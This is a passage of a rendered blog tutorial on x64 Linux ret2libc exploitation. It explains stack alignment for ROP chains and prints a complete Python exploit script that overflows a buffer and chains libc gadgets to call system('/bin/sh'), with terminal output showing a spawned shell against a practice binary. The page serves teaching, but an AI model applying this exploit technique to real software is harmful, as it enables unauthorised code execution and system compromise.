+<p>If segfaulting on a movaps instruction in buffered_vfprintf() or do_system() in the x86_64 challenges,
+then ensure the stack is 16-byte aligned before returning to GLIBC functions such as printf() or system().
+Some versions of GLIBC uses movaps instructions to move data onto the stack in certain functions. 
+The 64 bit calling convention requires the stack to be 16-byte aligned before a call instruction 
+but this is easily violated during ROP chain execution, causing all further calls from that 
+function to be made with a misaligned stack. movaps triggers a general protection fault 
+when operating on unaligned data, so try padding your ROP chain with an extra ret before 
+returning into a function or return further into a function to skip a push instruction.</p>
+
+<p>We can find an extra RET instruction address in the libc file, following exactly the 
+process we did in the POP RDI, RET gadget (using the ropper or a similar tool).
+The final exploitation script will be as follows:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">struct</span>
+
+<span class="n">libc_base_address</span> <span class="o">=</span> <span class="mh">0x00007ffff7dbe000</span>
+<span class="n">pop_rdi_offset</span> <span class="o">=</span> <span class="mh">0x0000000000023835</span>
+<span class="n">bin_sh_offset</span><span class="o">=</span> <span class="mh">0x198031</span>
+<span class="n">system_function_offset</span> <span class="o">=</span> <span class="mh">0x00000000000493d0</span>
+<span class="n">exit_function_offset</span> <span class="o">=</span> <span class="mh">0x000000000003b100</span> 
+<span class="n">ret_function_offset</span> <span class="o">=</span> <span class="mh">0x00000000000f6ae3</span>
+
+<span class="n">pop_rdi_address</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"Q"</span><span class="p">,</span><span class="n">libc_base_address</span><span class="o">+</span><span class="n">pop_rdi_offset</span><span class="p">)</span>
+<span class="n">bin_sh_address</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"Q"</span><span class="p">,</span><span class="n">libc_base_address</span><span class="o">+</span><span class="n">bin_sh_offset</span><span class="p">)</span>
+<span class="n">system_function_address</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"Q"</span><span class="p">,</span><span class="n">libc_base_address</span><span class="o">+</span><span class="n">system_function_offset</span><span class="p">)</span>
+<span class="n">exit_function_address</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"Q"</span><span class="p">,</span><span class="n">libc_base_address</span><span class="o">+</span><span class="n">exit_function_offset</span><span class="p">)</span>
+<span class="n">ret_function_address</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"Q"</span><span class="p">,</span><span class="n">libc_base_address</span><span class="o">+</span><span class="n">ret_function_offset</span><span class="p">)</span>
+
+<span class="n">buff</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">256</span>
+<span class="n">rbp</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mi">8</span>
+
+<span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">buff</span><span class="o">+</span><span class="n">rbp</span><span class="o">+</span><span class="n">ret_function_address</span><span class="o">+</span><span class="n">pop_rdi_address</span><span class="o">+</span><span class="n">bin_sh_address</span><span class="o">+</span><span class="n">system_function_address</span><span class="o">+</span><span class="n">exit_function_address</span><span class="p">)</span></code></pre></figure>
+
+<p>In addition, I have added one more return address at the end. If we exit the shell, system() function will try to retun to 
+an address, if it lacks that address, program will crash. After spawnig a shell it does not really matter but it is the 
+best practice I think.</p>
+
+<p>Let’s run the program.</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">KnuckleSecurity :: -&gt; ./ret2libc.elf <span class="si">$(</span>python ret2libc.py<span class="si">)</span>
+sh-5.1<span class="nv">$ </span><span class="nb">exit</span> <span class="c"># &lt;-- Spawned the sh shell.</span>
+KnuckleSecurity :: -&gt; </code></pre></figure>
+
+<p>Worked like charm. We have successfully spawned a shell.</p>
+
+<p>Let me show you what would have happened if we didn’t add the exit() function’s address.</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">KnuckleSecurity :: -&gt; ./ret2libc.elf <span class="si">$(</span>python ret2libc.py<span class="si">)</span>
+sh-5.1<span class="nv">$ </span><span class="nb">exit
+exit</span>
+<span class="o">[</span>1]    2021528 segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>  ./ret2libc.elf <span class="si">$(</span>python ret2libc.py<span class="si">)</span>
+KnuckleSecurity :: -&gt;</code></pre></figure>
+
+<p>Segmentation fault. Again, it does not matter after we drop the shell. Just for best practice, add it at the end.</p>
+
+<h1 id="bibliography">Bibliography</h1>
+<ul>
+  <li>
+    <p><a href="https://en.wikipedia.org/wiki/Function_prologue_and_epilogue"><strong>wikipedia.com-Function Prologue and Epilogue</strong></a><br /></p>
+  </li>
+  <li>
+    <p><a href="https://www.felixcloutier.com/x86/leave"><strong>feliclouiter.com-Leave</strong></a><br /></p>
+  </li>
+  <li>
+    <p><a href="https://www.isabekov.pro/stack-alignment-when-mixing-asm-and-c-code/"><strong>isabekov.pro-Stack Alignment When Mixing Asm and C Code</strong></a><br /></p>
+  </li>
+  <li>
+    <p><a href="https://ret2rop.blogspot.com/2018/08/return-to-libc.html"><strong>ret2prop.blogspot.com-return to libc</strong></a><br /></p>
+  </li>
+  <li>
+    <p><a href="https://research.csiro.au/tsblog/debugging-stories-stack-alignment-matters/"><strong>research.csiro.au-Debugging Stories Stack Alignment Matters</strong></a><br /></p>
+  </li>
+  <li>
+    <p><a href="https://stackoverflow.com/questions/54393105/libcs-system-when-the-stack-pointer-is-not-16-padded-causes-segmentation-faul"><strong>stackoverflow.com-Libc System When The Stack Pointer Is Not 16 Padded Causes Segmentation Fault</strong></a><br /></p>
+  </li>
+  <li>
+    <p><a href="https://stackoverflow.com/questions/49391001/why-does-the-x86-64-amd64-system-v-abi-mandate-a-16-byte-stack-alignment"><strong>Why Does the x86_64 Amd64 System V ABI Mandate a 16 Byte Stack Alignment</strong></a><br /></p>
+  </li>
+  <li>
+    <p><a href="https://valsamaras.medium.com/introduction-to-x64-binary-exploitation-part-2-return-into-libc-c325017f465"><strong>valsamaras.medium.com-Introduction to X64 Binary Exploitation Part-2</strong></a><br /></p>
+  </li>
+  <li>
+    <p><a href="https://crypto.stanford.edu/~blynn/asm/rop.html"><strong>crypto.stanford.edu-Rop</strong></a></p>
+  </li>
+  <li>
+    <p><a href="https://ace315dc-a-62cb3a1a-s-sites.googlegroups.com/site/cachememory2011/memory-hierarchy/hei.png?attachauth=ANoY7crqddm97fViorOVc7ytOnK_jH4jmrRj2dDh9NENJBbf5lbb6K_gsQMxWa-FR23COMxOMGmY7MdP54qTiJBIrCHlox_Y9MmQxooP2EAfagtz7zCoy1p6dFMwwz9lgDjdylZzdjPyUnBLtgp0VPeI18BSyI_TxStd_8sYOrpLduVLKWDyZ1cOo9_F67dkP_-D82KoM5Gww7cuIQvLchnERzRr962YRZ-pTfV9yoA3mEsaA1tmDGY%3D&amp;attredirects=0"><strong>Image-Memory Hiearchy</strong></a></p>
+  </li>
+  <li>
+    <p><a href="http://ref.x86asm.net/coder64.html"><strong>ref.x86asm.net-Coder64</strong></a></p>
+  </li>
+  <li>
+    <p><a href="https://www.isss.io/resources"><strong>isss.io-Resource</strong></a></p>
+  </li>
+  <li>
+    <p><a href="https://ctf101.org/binary-exploitation/overview/"><strong>ctf101.org-Binary Exploitation Overview</strong></a></p>
+  </li>
+  <li>
+    <p><a href="https://en.wikipedia.org/wiki/Calling_convention#x86-64"><strong>wikipedia-Calling Convention x86_64</strong></a></p>
+  </li>
+  <li>
+    <p><a href="https://man7.org/linux/man-pages/man7/libc.7.html"><strong>man7.org-libc</strong></a></p>
+  </li>
+</ul>
+
+      <br><p>Thanks for reading. If it was helpful and you want to support, you can buy me a coffee ;)</p>
+      <script type="text/javascript" src="https://cdnjs.buymeacoffee.com/1.0.0/button.prod.min.js" data-name="bmc-button" data-slug="burakbaris" data-color="#900000" data-emoji=""  data-font="Poppins" data-text="Buy me a coffee" data-outline-color="#ffffff" data-font-color="#ffffff" data-coffee-color="#FFDD00" ></script>
+    </div>
+
+    <div class="post__share">
+      <div class="share__list">
+        <a class="share__link share__facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/2022/12/10/stack-based-overflows-on-64bit-linux-2/" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook" rel="nofollow"><i class="ion ion-logo-facebook"></i></a>
+
+        <a class="share__link share__twitter" href="https://twitter.com/intent/tweet?text=X64%20Linux%20Binary%20Exploitation%20Part%202%20Ret2Libc&url=http://localhost:4000/2022/12/10/stack-based-overflows-on-64bit-linux-2/" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter" rel="nofollow"><i class="ion ion-logo-twitter"></i></a>
+
+        <a class="share__link share__pinterest" href="http://pinterest.com/pin/create/button/?url=http://localhost:4000/2022/12/10/stack-based-overflows-on-64bit-linux-2/&amp;media=http://localhost:4000/assets/img/posts/stack-based-overflows-on-64bit-linux/banner.png&amp;description=X64%20Linux%20Binary%20Exploitation%20Part%202%20Ret2Libc" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=900,height=500,toolbar=1,resizable=0'); return false;" title="Share on Pinterest" rel="nofollow"><i class="ion ion-logo-pinterest"></i></a>
+      </div>
+    </div>
+
+    <div class="post__navigation">
+      
+      <a class="prev" href="/2022/12/10/stack-based-overflows-on-64bit-linux/">
+        <img class="post__nav-image lazy" data-src="/assets/img/posts/stack-based-overflows-on-64bit-linux/banner.png" alt="X64 Linux Binary Exploitation Part 1 Stack Based Overflow">
+        <div class="post__nav-box">
+          <div class="post__nav post__nav__prev"><i class="ion ion-md-arrow-round-back"></i> Previous Post</div>
+          <h4 class="post__nav__title">X64 Linux Binary Exploitation Part 1 Stack Based Overflow</h4>
+        </div>
+      </a>
+      
+      
+    </div>
+
+  </article>
+</div>
+<!-- end post -->
+
+
+
+
+
+
+
+
+<div class="container">
+  <div class="related-posts is-related">
+    <div class="row">
+      <div class="col col-12">
+        <div class="container__inner">
+          <h3 class="related-title">You may also like</h3>
+          <div class="row grid">
+
+          
+            
+            
+
+            
+
+            
+            
+            
+            
+
+            
+
+            
+
+            <div class="article col col-4 col-d-6 col-t-12 grid__post">
+              <div class="article__inner">
+
+                
+                <a class="article__image" href="/2022/12/10/stack-based-overflows-on-64bit-linux/">
+                  <img class="lazy" data-src="/assets/img/posts/stack-based-overflows-on-64bit-linux/banner.png" alt="X64 Linux Binary Exploitation Part 1 Stack Based Overflow">
+                </a>
+                
+
+                <div class="article__content">
+
+                  <div class="article__meta">
+                    <span class="article__minutes">
+                      
+                      
+                        42 min read
+                      
+                      <time class="article__date"
+                        datetime="2022-12-10T22:20:00+00:00">Dec 10, 2022</time>
+                    </span>
+                  </div>
+
+                  <h2 class="article__title">X64 Linux Binary Exploitation Part 1 Stack Based Overflow</h2>
+
+                  <p class="article__excerpt">Buffer Buffer Overflows</p>
+
+                  <div class="article__bottom">
+
+                    
+                    <div class="article__author">
+                      <a href="/about/" aria-label="Burak Baris"><img class="article__author-image lazy" data-src="/images/avatar.png" alt="Burak Baris's Picture"></a>
+                    </div>
+                    
+
+                    <div class="article__bottom-meta">
+                      
+                        <a href="/about/" class="article__author-link">Burak Baris</a>
+                      
+                      
+                      <span>in</span>
+                      <span class="article-tags">
+                        
+                          <a href="/tag/c" class="article__tag">c</a>
+                        
+                          <a href="/tag/assembly" class="article__tag">assembly</a>
+                        
+                          <a href="/tag/x86" class="article__tag">x86</a>
+                        
+                          <a href="/tag/32-bit" class="article__tag">32-bit</a>
+                        
+                          <a href="/tag/memory-segmentation" class="article__tag">memory-segmentation</a>
+                        
+                          <a href="/tag/memory-segmentation" class="article__tag">memory-segmentation</a>
+                        
+                          <a href="/tag/buffer-overflows" class="article__tag">buffer-overflows</a>
+                        
+                      </span>
+                      
+                    </div>
+                  </div>
+
+                </div>
+
+              </div>
+            </div>
+
+            
+                
+              
+            
+            
+            
+
+            
+
+            
+
+            <div class="article col col-4 col-d-6 col-t-12 grid__post">
+              <div class="article__inner">
+
+                
+                <a class="article__image" href="/2022/12/02/memory-segmentation/">
+                  <img class="lazy" data-src="/assets/img/posts/memory-segmentation/banner2.jpg" alt="Memory Segmentation">
+                </a>
+                
+
+                <div class="article__content">
+
+                  <div class="article__meta">
+                    <span class="article__minutes">
+                      
+                      
+                        19 min read
+                      
+                      <time class="article__date"
+                        datetime="2022-12-02T22:20:00+00:00">Dec 2, 2022</time>
+                    </span>
+                  </div>
+
+                  <h2 class="article__title">Memory Segmentation</h2>
+
+                  <p class="article__excerpt">Memory Segmentation</p>
+
+                  <div class="article__bottom">
+
+                    
+                    <div class="article__author">
+                      <a href="/about/" aria-label="Burak Baris"><img class="article__author-image lazy" data-src="/images/avatar.png" alt="Burak Baris's Picture"></a>
+                    </div>
+                    
+
+                    <div class="article__bottom-meta">
+                      
+                        <a href="/about/" class="article__author-link">Burak Baris</a>
+                      
+                      
+                      <span>in</span>
+                      <span class="article-tags">
+                        
+                          <a href="/tag/c" class="article__tag">c</a>
+                        
+                          <a href="/tag/assembly" class="article__tag">assembly</a>
+                        
+                          <a href="/tag/x86" class="article__tag">x86</a>
+                        
+                          <a href="/tag/32-bit" class="article__tag">32-bit</a>
+                        
+                          <a href="/tag/memory-segmentation" class="article__tag">memory-segmentation</a>
+                        
+                          <a href="/tag/memory-segmentation" class="article__tag">memory-segmentation</a>
+                        
+                      </span>
+                      
+                    </div>
+                  </div>
+
+                </div>
+
+              </div>
+            </div>
+
+            
+                
+              
+            
+            
+            
+
+            
+
+            
+            
+            
+            
+
+            
+
+            
+            
+            
+            
+
+            
+
+            
+            
+            
+            
+
+            
+
+            
+            
+            
+            
+
+            
+
+            
+            
+            
+            
+
+            
+
+            
+            
+            
+            
+
+            
+
+            
+            
+            
+            
+
+            
+
+            
+            
+            
+            
+
+            
+
+            
+            
+            
+            
+
+            
+
+            
+            
+            
+            
+
+            
+
+            
+            
+            
+            
+
+            
+
+            
+            
+            
+            
+
+            
+
+            
+            
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+  </main> 
+  <!-- end content -->
+  
+  <div class="top" title="Top"><i class="ion ion-ios-arrow-up"></i></div>
+  <!-- begin footer-widgets -->
+<section class="footer-widgets">
+  <div class="container">
+    <div class="row">
+      <div class="col col-4 col-d-6 col-t-12">
+  <div class="widget widget-recent">
+
+    <div class="widget__head">
+      <h3 class="widget__title">Latest Posts</h3>
+    </div>
+
+    
+    <div class="recent-posts">
+      
+      <a class="recent-posts__image" href="/2022/12/10/stack-based-overflows-on-64bit-linux-2/"><img class="lazy" data-src="/assets/img/posts/stack-based-overflows-on-64bit-linux/banner.png" alt="X64 Linux Binary Exploitation Part 2 Ret2Libc"></a>
+      
+      <div class="recent-posts__content">
+        <div class="article__meta">
+          <span class="article__minutes">
+            
+            
+              24 min read
+            
+          </span>
+          <time class="article__date"
+            datetime="2022-12-10T22:20:00+00:00">Dec 10, 2022</time>
+        </div>
+        <h4 class="recent-posts__title"><a href="/2022/12/10/stack-based-overflows-on-64bit-linux-2/">X64 Linux Binary Exploitation Part 2 Ret2Libc</a></h4>
+        <div class="article__bottom">
+          <div class="article__author">
+            <a href="/about/" aria-label="Burak Baris"><img class="article__author-image lazy" data-src="/images/avatar.png" alt="Burak Baris's Picture"></a>
+          </div>
+          <div class="article__bottom-meta">
+            <a href="/about/" class="article__author-link">Burak Baris</a>
+          </div>
+        </div>
+      </div>
+    </div>
+    
+    <div class="recent-posts">
+      
+      <a class="recent-posts__image" href="/2022/12/10/stack-based-overflows-on-64bit-linux/"><img class="lazy" data-src="/assets/img/posts/stack-based-overflows-on-64bit-linux/banner.png" alt="X64 Linux Binary Exploitation Part 1 Stack Based Overflow"></a>
+      
+      <div class="recent-posts__content">
+        <div class="article__meta">
+          <span class="article__minutes">
+            
+            
+              42 min read
+            
+          </span>
+          <time class="article__date"
+            datetime="2022-12-10T22:20:00+00:00">Dec 10, 2022</time>
+        </div>
+        <h4 class="recent-posts__title"><a href="/2022/12/10/stack-based-overflows-on-64bit-linux/">X64 Linux Binary Exploitation Part 1 Stack Based Overflow</a></h4>
+        <div class="article__bottom">
+          <div class="article__author">
+            <a href="/about/" aria-label="Burak Baris"><img class="article__author-image lazy" data-src="/images/avatar.png" alt="Burak Baris's Picture"></a>
+          </div>
+          <div class="article__bottom-meta">
+            <a href="/about/" class="article__author-link">Burak Baris</a>
+          </div>
+        </div>
+      </div>
+    </div>
+    
+
+  </div>
+</div>
+      
+<div class="col col-4 col-d-6 col-t-12">
+  <div class="widget widget-tag-cloud">
+    <div class="widget__head">
+      <h3 class="widget__title">Explore Tags</h3>
+    </div>
+    <div class="tag__cloud">
+      <a href="/tag/32-bit/" class="set-3">32-bit</a> <a href="/tag/cryptography/" class="set-2">Cryptography</a> <a href="/tag/encryption/" class="set-1">Encryption</a> <a href="/tag/openssl/" class="set-1">OpenSSL</a> <a href="/tag/pkc/" class="set-2">PKC</a> <a href="/tag/pki/" class="set-2">PKI</a> <a href="/tag/pentesting/" class="set-1">Pentesting</a> <a href="/tag/tryhackme-machines/" class="set-5">TryHackme Machines</a> <a href="/tag/arch-linux/" class="set-1">arch-linux</a> <a href="/tag/assembly/" class="set-3">assembly</a> <a href="/tag/autorun-privesc/" class="set-1">autorun-privesc</a> <a href="/tag/boot-managers/" class="set-1">boot-managers</a> <a href="/tag/bruteforce/" class="set-3">bruteforce</a> <a href="/tag/buffer-overflow/" class="set-1">buffer-overflow</a> <a href="/tag/buffer-overflows/" class="set-2">buffer-overflows</a> <a href="/tag/c/" class="set-3">c</a> <a href="/tag/cracking/" class="set-2">cracking</a> <a href="/tag/ctf/" class="set-5">ctf</a> <a href="/tag/directory-traversal/" class="set-1">directory-traversal</a> <a href="/tag/grub/" class="set-1">grub</a> <a href="/tag/ip-addresses/" class="set-1">ip-addresses</a> <a href="/tag/jenkins/" class="set-1">jenkins</a> <a href="/tag/linux/" class="set-1">linux</a> <a href="/tag/linux-privesc/" class="set-1">linux-privesc</a> <a href="/tag/memory-segmentation/" class="set-5">memory-segmentation</a> <a href="/tag/metasploit/" class="set-4">metasploit</a> <a href="/tag/mindows-privesc/" class="set-2">mindows-privesc</a> <a href="/tag/network-protocols/" class="set-1">network protocols</a> <a href="/tag/package-managers/" class="set-1">package-managers</a> <a href="/tag/pentesting/" class="set-5">pentesting</a> <a href="/tag/php/" class="set-1">php</a> <a href="/tag/powershell/" class="set-1">powershell</a> <a href="/tag/remote-code-execution/" class="set-4">remote-code-execution</a> <a href="/tag/reverse-shell/" class="set-1">reverse-shell</a> <a href="/tag/router/" class="set-1">router</a> <a href="/tag/shell-injection/" class="set-1">shell-injection</a> <a href="/tag/sql-injection/" class="set-1">sql-injection</a> <a href="/tag/subnetting/" class="set-1">subnetting</a> <a href="/tag/switch/" class="set-1">switch</a> <a href="/tag/unqoted-service-path/" class="set-2">unqoted-service-path</a> <a href="/tag/windows/" class="set-2">windows</a> <a href="/tag/windows-privesc/" class="set-2">windows-privesc</a> <a href="/tag/windows-tokens/" class="set-1">windows-tokens</a> <a href="/tag/x509/" class="set-2">x509</a> <a href="/tag/x86/" class="set-3">x86</a>
+    </div>
+  </div>
+</div>
+
+<!--
+
+
+-->
+    </div>
+  </div>
+</section>
+<!-- end footer-widgets -->
+
+<!-- begin footer -->
+<footer class="footer">
+  <div class="container">
+    <div class="row">
+      <div class="col col-12">
+      <div class="footer__inner">
+        <div class="copyright">2023 &copy; <a href="/">:~$ Knuckle$ecurity_</a>. Authoring by Burak Baris.
+        
+<div class="social">
+  <ul class="social__list list-reset">
+    
+    <li class="social__item">
+      <a class="social__link" href="https://www.linkedin.com/in/burak-baris/" aria-label="social icon"><i class="ion ion-logo-linkedin"></i></a>
+    </li>
+    
+    <li class="social__item">
+      <a class="social__link" href="https://github.com/KnuckleSecurity" aria-label="social icon"><i class="ion ion-logo-github"></i></a>
+    </li>
+    
+    <li class="social__item">
+      <a class="social__link" href="https://twitch.tv/knucklesecurity" aria-label="social icon"><i class="ion ion-logo-twitch"></i></a>
+    </li>
+    
+    <li class="social__item">
+      <a class="social__link" href="https://www.instagram.com/burak_baris_/" aria-label="social icon"><i class="ion ion-logo-instagram"></i></a>
+    </li>
+    
+    <li class="social__item">
+      <a class="social__link" href="https://twitter.com/knucklesec" aria-label="social icon"><i class="ion ion-logo-twitter"></i></a>
+    </li>
+    
+    <li class="social__item">
+      <a class="social__link" href="https://tryhackme.com/p/knucklesec" aria-label="social icon"><i class="ion fas fa-terminal"></i></a>
+    </li>
+    
+  </ul>
+</div>
+
+        </div>
+      </div>
+    </div>
+  </div>
+</footer>
+<!-- end footer -->
+
+  <script src="/js/vendors/jquery-3.5.1.min.js"></script>
+<script src="/js/vendors/simple-jekyll-search.min.js"></script>
+<script src="/js/vendors/jquery.fitvids.js"></script>
+<script src="/js/vendors/lazyload.min.js"></script>
+<script src="/js/vendors/transition.js"></script>
+<script src="/js/vendors/zoom.min.js"></script>
+<script src="/js/common.js"></script>
+<script>
+  var base_url = "",
+    pagination_next_url = base_url + '/page2',
+    pagination_next_page_number = '',
+    pagination_available_pages_number = '';
+</script>
+</body>
+
+</html>
